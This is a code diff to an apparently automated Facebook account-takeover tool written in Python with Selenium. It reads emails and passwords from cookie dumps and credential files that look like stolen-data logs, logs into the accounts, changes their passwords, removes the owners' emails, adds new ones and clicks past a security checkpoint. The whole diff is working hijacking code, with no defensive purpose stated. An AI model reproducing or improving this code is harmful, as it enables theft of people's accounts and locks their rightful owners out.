@@ -58,18 +58,21 @@ class FacebookSelenium:
                         "sameSite": "None",
                         "value": cookieSplit[6]
                         })
+                    if "Password" in cookie or "password" in cookie:
+                        self.old_password = cookie.replace('"password": "', "").replace('"Password": "', "").replace('",', "").replace(" ", "")
                     if "Email" in cookie:
                         self.old_mail = cookie.replace('"Email": "', "").replace('",', "").replace(" ", "")
-                        filePassword = open(passwordPath, 'r')
-                        listPassword = filePassword.readlines()
-                        index = 0
-                        for password in listPassword:
-                            if self.old_mail and self.old_mail in password:
-                                self.old_password = listPassword[index+1].replace("Password: ", "").replace("password: ", "").replace(" ", "")
-                            if not self.old_password or len(self.old_password) < 5:
-                                if 'facebook.com' in password:
-                                    self.old_password = listPassword[index+2].replace("Password: ", "").replace("password: ", "").replace(" ", "")
-                            index += 1
+                        if not self.old_password or len(self.old_password) < 5:
+                            filePassword = open(passwordPath, 'r')
+                            listPassword = filePassword.readlines()
+                            index = 0
+                            for password in listPassword:
+                                if self.old_mail and self.old_mail in password:
+                                    self.old_password = listPassword[index+1].replace("Password: ", "").replace("password: ", "").replace(" ", "")
+                                if not self.old_password or len(self.old_password) < 5:
+                                    if 'facebook.com' in password:
+                                        self.old_password = listPassword[index+2].replace("Password: ", "").replace("password: ", "").replace(" ", "")
+                                index += 1
                     if not self.old_password or len(self.old_password) < 5:
                         filePassword = open(passwordPath, 'r')
                         listPassword = filePassword.readlines()
@@ -132,6 +135,7 @@ class FacebookSelenium:
             except:
                 pass            
             #change password
+            time.sleep(10)
             try:
                 time.sleep(3)
                 print('dzo 5')
@@ -143,12 +147,13 @@ class FacebookSelenium:
                 repeatPassword = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/table/tbody/tr[2]/td[2]/div/input")
                 repeatPassword.send_keys(self.new_password)
                 
-                time.sleep(2)
+                time.sleep(5)
                 nextChangePassword = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
                 nextChangePassword.click()
-                time.sleep(3)
+                time.sleep(5)
             except:
                 pass
+            time.sleep(5)
             #delete old email
             oldEmail = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/div[2]/div/ul/li/div/label/div/div")
             oldEmail.click()
@@ -156,6 +161,12 @@ class FacebookSelenium:
             oldEmailBtn = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
             oldEmailBtn.click()
             time.sleep(3)
+            
+            try:
+                checkpointButtonContinue = self.driver.find_element("id", "checkpointButtonContinue")
+                checkpointButtonContinue.click()
+            except:
+                pass
             
             newEmailInput = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/div/div[2]/input")
             newEmailInput.send_keys(self.mail)
@@ -369,5 +380,5 @@ class FacebookSelenium:
             self.ref.checksuccess.emit(False, self.row, self.folderName, self.old_mail, self.mail, self.password)  
         #protected account
         time.sleep(3)
-        self.driver.quit()
+        # self.driver.quit()
         return
